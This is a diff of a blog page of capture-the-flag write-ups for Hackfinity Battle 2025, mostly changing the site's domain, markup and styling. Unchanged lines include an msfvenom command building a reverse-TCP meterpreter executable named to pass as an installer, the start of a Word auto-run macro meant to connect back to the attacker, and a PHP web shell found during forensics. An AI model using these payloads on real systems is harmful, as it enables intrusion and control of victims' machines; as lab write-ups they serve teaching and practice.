@@ -7,12 +7,12 @@
         <meta name="description" content="Collection of writeups for Hackfinity Battle CTF 2025 challenges.">
         <meta name="HandheldFriendly" content="True">
         <meta name="MobileOptimized" content="320">
-        <meta name="generator" content="Hugo 0.148.2">
+        <meta name="generator" content="Hugo 0.168.0">
         <meta name="robots" content="index,follow">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         
-        <link rel="stylesheet" href="https://r4p3cks.github.io/dist/site.css">
-        <link rel="stylesheet" href="https://r4p3cks.github.io/dist/syntax.css">
+        <link rel="stylesheet" href="https://r4p3cks.at.eu.org/dist/site.css">
+        <link rel="stylesheet" href="https://r4p3cks.at.eu.org/dist/syntax.css">
         <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,400,600,700,300&subset=latin,cyrillic-ext,latin-ext,cyrillic">
         <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
         
@@ -32,7 +32,7 @@
                     <div class="site-title-wrapper">
                         
                             <h1 class="site-title">
-                                <a href="https://r4p3cks.github.io/">R4p3cks Blog</a>
+                                <a href="https://r4p3cks.at.eu.org/">R4p3cks Blog</a>
                             </h1>
                         
                         
@@ -196,7 +196,8 @@ Can you and Specter find the name of the burger restaurant?</p>
 <h5 id="challenge-1">Challenge</h5>
 <p>Unfortunately, we were unable to recover any more CCTV footage. Just as we were losing hope, Void clutched again and managed to crack the encryption on a message we recovered, sent from Cipher to Phicer in 2022:</p>
 <blockquote>
-<p>Meet me at the Mr.Wok safe house</p></blockquote>
+<p>Meet me at the Mr.Wok safe house</p>
+</blockquote>
 <p>Can you find the full address of their safe house?</p>
 <p>Flag format: <strong>THM{streetnumber_street_name}</strong> , no capitals and no special symbols.</p>
 <p>For example: If the address is 24 Rua Pablo Antonio, the flag would be <strong>THM{23_pablo_antonio}</strong>.</p>
@@ -210,7 +211,8 @@ Can you and Specter find the name of the burger restaurant?</p>
 After some research and reverse engineering, you discover they have forgotten to remove some debugging from their code. The ransomware saves this data to the tmp directory.</p>
 <p>Can you find the RSA private key?</p>
 <blockquote>
-<p>It is provided a VM with the necessary!</p></blockquote>
+<p>It is provided a VM with the necessary!</p>
+</blockquote>
 <p>Starting the provided VM, it is prompted the following:</p>
 <p><img src="/hackfinity-battle-ctf-2025/DarkMatter/ransomware.png" alt="image"></p>
 <h5 id="solution-2">Solution</h5>
@@ -223,7 +225,8 @@ we can confirm that this key is a RSA public key because of the <em>n</em> and <
 <p>This <em>n</em> is called the modulus and is calculated by <em>p * q</em> (Two large prime numbers that are kept secret) operation.
 The public exponent, is typically a small prime number chosen to be relatively prime to (p−1)(q−1).
 What we want is <em>d</em> the private exponent, calculated as:
-<img src="/hackfinity-battle-ctf-2025/DarkMatter/dformula.png" alt="image"></p></blockquote>
+<img src="/hackfinity-battle-ctf-2025/DarkMatter/dformula.png" alt="image"></p>
+</blockquote>
 <p>So if we obtain <em>p</em> and <em>q</em> we can obtain <em>d</em> (private key). If <em>n</em> is a small number, it is computationally feasible to factorize it and obtain p and q, which it is. We used a online number facotrizer to be more fast in the process, rather than doing a python script.
 We used this site (<a href="https://www.numberempire.com/numberfactorizer.php">Number Empire Number Factorizer</a>).</p>
 <p>The p and q are the following numbers:</p>
@@ -236,15 +239,18 @@ We used this site (<a href="https://www.numberempire.com/numberfactorizer.php">N
 <h5 id="challenge-3">Challenge</h5>
 <p>We intercepted one of Cipher&rsquo;s messages containing their next target. They encrypted their message using a repeating-key XOR cipher. However, they made a critical error—every message always starts with the header:</p>
 <blockquote>
-<p>ORDER:</p></blockquote>
+<p>ORDER:</p>
+</blockquote>
 <p>Can you help void decrypt the message and determine their next target?
 Here is the message we intercepted:</p>
 <blockquote>
-<p>1c1c01041963730f31352a3a386e24356b3d32392b6f6b0d323c22243f63731a0d0c302d3b2b1a292a3a38282c2f222d2a112d282c31202d2d2e24352e60</p></blockquote>
+<p>1c1c01041963730f31352a3a386e24356b3d32392b6f6b0d323c22243f63731a0d0c302d3b2b1a292a3a38282c2f222d2a112d282c31202d2d2e24352e60</p>
+</blockquote>
 <h5 id="solution-3">Solution</h5>
 <p>The challenge explicitly indicates that the message used repeating-key XOR cipher and every message always start with the header <strong><em>ORDER:</em></strong>.</p>
 <blockquote>
-<p>A repeating-key XOR cipher is a type of encryption that uses a key that is repeated to match the length of the plaintext. Each character of the plaintext is XORed with the corresponding character of the key, making it a symmetric encryption method where the same process is used for both encryption and decryption.</p></blockquote>
+<p>A repeating-key XOR cipher is a type of encryption that uses a key that is repeated to match the length of the plaintext. Each character of the plaintext is XORed with the corresponding character of the key, making it a symmetric encryption method where the same process is used for both encryption and decryption.</p>
+</blockquote>
 <p>If every message starts with header <strong><em>ORDER:</em></strong> we can find the first characters in the intercepted message (Because of the XOR). Using an online encrypter and decrypter (<a href="https://md5decrypt.net/en/Xor/">md5decrypt.net/en/Xor/</a>), we managed to find the following:</p>
 <p><img src="/hackfinity-battle-ctf-2025/Order/firstdec.png" alt="image"></p>
 <p>This indicates that <strong><em>SNEAKY</em></strong> was the key used to encrypt the message. So repeating the process but this time with SNEAKY as the key we can decrypt the message.</p>
@@ -266,7 +272,8 @@ This could be our best chance to forecast Cipher&rsquo;s next move and dismantle
 Basically, when cipher opens the document, it will run a piece of code that will connect to our machine. For this we need to activate the macros in Word.</p>
 <blockquote>
 <p>File -&gt; Options -&gt; Customize Ribbon -&gt; Enable Developer Options in the Right Pane.
-After this, we need to create our macro code. The code is the following:</p></blockquote>
+After this, we need to create our macro code. The code is the following:</p>
+</blockquote>
 <pre tabindex="0"><code class="language-vba" data-lang="vba">Sub AutoOpen()
 MyMacro
 End Sub
@@ -309,7 +316,7 @@ The clock is ticking, though too much time and Cipher will know something is wro
 <p><img src="/hackfinity-battle-ctf-2025/ShadowPhishing/firstemail.png" alt="image"></p>
 <p>Cipher told ShadowByte that he needs a exe! Like Ghost Phishing challenge, we could create a reverse TCP shell windows executable. For this we used metasploit for a faster and easy way to create this.</p>
 <p>We used this command to generate our executable named silentEdgeInstaller.exe to match what Cipher wanted:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>10.23.56.134 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">8080</span> -f exe -o /home/thm/silentEdgeInstaller.exe
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>10.23.56.134 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">8080</span> -f exe -o /home/thm/silentEdgeInstaller.exe
 </span></span></code></pre></div><p>After we went to the msfconsole and created our payload and started listenning for incoming connections.
 <img src="/hackfinity-battle-ctf-2025/ShadowPhishing/metasploit.png" alt="image">
 <img src="/hackfinity-battle-ctf-2025/ShadowPhishing/metasploit2.png" alt="image"></p>
@@ -325,7 +332,7 @@ The clock is ticking, though too much time and Cipher will know something is wro
 <p>It is said that the cipher&rsquo;s legion of bots left a dangerous web shell implant. Exploring the /var/www/html folder we found a shoulder containing the web application mentioned in the statement.</p>
 <p><img src="/hackfinity-battle-ctf-2025/InfinityShell/folder.png" alt="image"></p>
 <p>This site, probably contained some kind of field to insert files without checking them. Probably, cipher abused this&hellip; We checked the img folder and found a suspicious file called images.php with following code:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">system</span>(<span style="color:#a6e22e">base64_decode</span>($_GET[<span style="color:#e6db74">&#39;query&#39;</span>])); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">system</span>(<span style="color:#a6e22e">base64_decode</span>($_GET[<span style="color:#e6db74">&#39;query&#39;</span>])); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
 </span></span></span></code></pre></div><p>This file is weird. First is using system() function and is in the middle of the images. At the time we were clueless about this file, probably was being used by the site to get images, but using base64_decode was strange.</p>
 <p>After a bit of investigation, we found nothing. If the attacker uploaded a malicious file, he probably used it as a web shell. So we checked the logs. After a bit of searching we found the following:</p>
 <p><img src="/hackfinity-battle-ctf-2025/InfinityShell/folder2.png" alt="image"></p>
@@ -342,9 +349,9 @@ The clock is ticking, though too much time and Cipher will know something is wro
 <p>It&rsquo;s provided a Machine to investigate</p>
 <h5 id="solution-7">Solution</h5>
 <p>From the description, we thought in starting searching in the kernel logs. Executing the command:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo dmesg
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo dmesg
 </span></span></code></pre></div><p>It was possible to watch some interesting things from the output:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>   26.371308<span style="color:#f92672">]</span> systemd-journald<span style="color:#f92672">[</span>132<span style="color:#f92672">]</span>: File /var/log/journal/dc7c8ac5c09a4bbfaf3d09d399f10d96/user-1000.journal corrupted or uncleanly shut down, renaming and replacing.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>   26.371308<span style="color:#f92672">]</span> systemd-journald<span style="color:#f92672">[</span>132<span style="color:#f92672">]</span>: File /var/log/journal/dc7c8ac5c09a4bbfaf3d09d399f10d96/user-1000.journal corrupted or uncleanly shut down, renaming and replacing.
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>   32.701060<span style="color:#f92672">]</span> spatch: loading out-of-tree module taints kernel.
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>   32.701072<span style="color:#f92672">]</span> spatch: module verification failed: signature and/or required key missing - tainting kernel
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>   32.702610<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>CIPHER BACKDOOR<span style="color:#f92672">]</span> Module loaded. Write data to /proc/cipher_bd
@@ -358,13 +365,13 @@ The clock is ticking, though too much time and Cipher will know something is wro
 <li>The backdoor exists ([CIPHER BACKDOOR]) and accepts commands though the /proc/cipher_bd archive.
 Let&rsquo;s find where this &lsquo;spatch&rsquo; is:</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -type f -name <span style="color:#e6db74">&#39;spatch.ko&#39;</span> 2&gt;/dev/null
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -type f -name <span style="color:#e6db74">&#39;spatch.ko&#39;</span> 2&gt;/dev/null
 </span></span></code></pre></div><p>Output:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/lib/modules/6.8.0-1016-aws/kernel/drivers/misc/spatch.ko
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/lib/modules/6.8.0-1016-aws/kernel/drivers/misc/spatch.ko
 </span></span></code></pre></div><p>After getting the path we search inside the module:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>strings /lib/modules/6.8.0-1016-aws/kernel/drivers/misc/spatch.ko | less
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>strings /lib/modules/6.8.0-1016-aws/kernel/drivers/misc/spatch.ko | less
 </span></span></code></pre></div><p>Output:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>6<span style="color:#f92672">[</span>CIPHER BACKDOOR<span style="color:#f92672">]</span> Module loaded. Write data to /proc/%s
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>6<span style="color:#f92672">[</span>CIPHER BACKDOOR<span style="color:#f92672">]</span> Module loaded. Write data to /proc/%s
 </span></span><span style="display:flex;"><span>6<span style="color:#f92672">[</span>CIPHER BACKDOOR<span style="color:#f92672">]</span> Module unloaded.
 </span></span><span style="display:flex;"><span>3<span style="color:#f92672">[</span>CIPHER BACKDOOR<span style="color:#f92672">]</span> Failed to read output file
 </span></span><span style="display:flex;"><span>6<span style="color:#f92672">[</span>CIPHER BACKDOOR<span style="color:#f92672">]</span> Command Output: %s
@@ -384,16 +391,19 @@ Let&rsquo;s find where this &lsquo;spatch&rsquo; is:</li>
 <h5 id="challenge-8">Challenge</h5>
 <p>Cipher has gone dark, but intel reveals he’s hiding critical secrets inside Tetris, a popular video game. Hack it and uncover the encrypted data buried in its code.</p>
 <blockquote>
-<p>It is provided a zip with a executable inside it <a href="/hackfinity-battle-ctf-2025/TheGame/Tetrix.exe-1741979048280.zip">Download_Tetrix.zip</a></p></blockquote>
+<p>It is provided a zip with a executable inside it <a href="/hackfinity-battle-ctf-2025/TheGame/Tetrix.exe-1741979048280.zip">Download_Tetrix.zip</a></p>
+</blockquote>
 <h5 id="solution-8">Solution</h5>
 <p>This challenge was very easy. We extracted the zip and isolated the executable. With the program <em>strings</em> we found the flag.</p>
 <blockquote>
-<p>$ strings Tetrix.exe | grep THM</p></blockquote>
+<p>$ strings Tetrix.exe | grep THM</p>
+</blockquote>
 <h4 id="the-game-v2">The Game v2</h4>
 <h5 id="challenge-9">Challenge</h5>
 <p>Cipher’s trail led us to a new version of Tetris hiding encrypted information. As we cracked its code, a chilling message emerged: &ldquo;The game is never over.&rdquo;</p>
 <blockquote>
-<p>It is provided a zip with a executable inside it <a href="/hackfinity-battle-ctf-2025/TheGame2/TetrixFinalv2.exe-1742225230694.zip">Download_Tetrix_v2.zip</a></p></blockquote>
+<p>It is provided a zip with a executable inside it <a href="/hackfinity-battle-ctf-2025/TheGame2/TetrixFinalv2.exe-1742225230694.zip">Download_Tetrix_v2.zip</a></p>
+</blockquote>
 <h5 id="solution-9">Solution</h5>
 <p>This challenge was harder than the v1 version of this. This time using <em>strings</em> was not possible to obtain the flag or any useful info.
 To gather more information we executed the game in a secure environment. We compared it to the version 1 and it was different. The most different thing was that the v2 has a string saying the following:</p>
@@ -432,7 +442,7 @@ Unsuccessfully.</p>
             <div class="container">
                 <div class="site-title-wrapper">
                     <h1 class="site-title">
-                        <a href="https://r4p3cks.github.io/">R4p3cks Blog</a>
+                        <a href="https://r4p3cks.at.eu.org/">R4p3cks Blog</a>
                     </h1>
                     <a class="button-square button-jump-top js-jump-top" href="#" aria-label="Back to Top">
                         <i class="fa fa-angle-up" aria-hidden="true"></i>
@@ -441,14 +451,14 @@ Unsuccessfully.</p>
 
                 
                 <p class="footer-copyright">
-                    <span>&copy; 2025 / Powered by <a href="https://gohugo.io/">Hugo</a></span>
+                    <span>&copy; 2026 / Powered by <a href="https://gohugo.io/">Hugo</a></span>
                 </p>
             </div>
         </footer>
 
-        <script src="https://r4p3cks.github.io/js/jquery-1.11.3.min.js"></script>
-        <script src="https://r4p3cks.github.io/js/jquery.fitvids.js"></script>
-        <script src="https://r4p3cks.github.io/js/scripts.js"></script>
+        <script src="https://r4p3cks.at.eu.org/js/jquery-1.11.3.min.js"></script>
+        <script src="https://r4p3cks.at.eu.org/js/jquery.fitvids.js"></script>
+        <script src="https://r4p3cks.at.eu.org/js/scripts.js"></script>
         
     </body>
 </html>
